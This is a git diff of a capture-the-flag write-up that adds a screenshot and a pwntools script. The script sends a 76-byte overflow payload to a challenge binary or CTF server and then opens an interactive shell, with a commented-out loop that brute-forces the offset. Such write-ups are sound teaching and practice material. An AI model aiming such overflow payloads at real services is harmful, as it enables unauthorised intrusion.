@@ -77,8 +77,50 @@ nc ctf.tcp1p.com 3830
 
 
 11. When i tried to read the `flag()` function, notice if a char is `_` hence shall printed null bytes, which means the null bytes is an underscore.
-12. We got the flag!
 
+![image](https://user-images.githubusercontent.com/70703371/215702960-a824fa57-430f-439f-b295-e26f3fabd007.png)
+
+
+13. We got the flag!
+
+> THE SCRIPT
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else: 
+        return process([exe] + argv, *a, **kw)
+
+
+exe = './chall'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+sh = start()
+'''
+for i in range(32, 101):
+    try:
+        sh = start()
+        bytess = '{}'.format(i)
+        pay = b'A' * int(bytess)
+        sh.sendlineafter('?',pay)
+        get = sh.recvline()
+        print(get)
+    except EOFError:
+        pass
+'''
+#32, 53, 54, 75, 76
+pay = flat([
+    b'A' * 76
+])
+sh.sendlineafter('?', pay)
+sh.interactive()
+```
 
 ## FLAG
 
